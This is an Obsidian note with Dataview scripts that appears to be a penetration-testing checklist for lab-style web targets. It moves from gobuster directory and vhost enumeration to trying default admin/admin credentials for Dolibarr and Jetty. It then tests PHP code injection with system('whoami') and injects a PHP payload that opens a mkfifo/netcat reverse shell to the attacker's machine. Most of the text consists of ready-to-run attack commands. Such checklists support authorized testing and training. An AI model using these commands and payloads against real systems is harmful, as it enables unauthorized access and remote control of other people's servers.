Visit the web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
If find any domain names,

Add hosts to /etc/hosts 
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `echo "${ip} [domain_name]" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

Use GoBuster to enumerate vhosts and directories

Directories
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `gobuster dir --url http://${ip}/ --wordlist /usr/share/wordlists/dirb/big.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
VHosts
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo gobuster vhost -u http://${ip} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`;

dv.paragraph("```bash\n" + command + "\n```");
```
Add newfound vhost to /etc/hosts
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `echo "${ip} [domain_name]" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

If admin login page is found,

Google for default credentials

| Service  | Version          | User  | Username | Password |
| -------- | ---------------- | ----- | -------- | -------- |
| Dolibarr | 17.0.0           | Admin | admin    | admin    |
| Jetty    | 9.4.39.v20210325 | Admin | admin    | admin    |

Look for php code inclusion

Templates
Pages

Test for php execution
```
<?PHP echo system("whoami");?>
```

If it works, obtain a reverse shell

Start a nc listener

```
nc -lvnp 4444
```

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;

dv.paragraph("```bash\n" + command + "\n```");
```
Once shell is obtained, [[4 Shell Upgrade]]
